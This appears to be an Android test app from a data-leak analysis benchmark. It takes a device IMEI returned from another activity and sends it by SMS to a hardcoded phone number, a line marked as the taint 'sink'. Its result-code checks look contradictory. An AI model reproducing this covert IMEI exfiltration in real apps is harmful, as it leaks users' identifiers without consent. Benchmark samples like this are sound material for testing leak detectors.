package com.example.shiva.statefulintent;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        Intent i = new Intent(this, SendActivity.class);
        startActivityForResult(i, 1);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data)
    {
        if (resultCode==1){
            if (resultCode== Activity.RESULT_OK){
                String imei=data.getStringExtra("result");
                sendImei(imei);
            }

            if (resultCode==Activity.RESULT_CANCELED){

            }

        }

    }

    public void sendImei(String imei)
    {
        SmsManager sms = SmsManager.getDefault();
        sms.sendTextMessage("4193784172", null, imei, null, null);  //Sink
    }

}
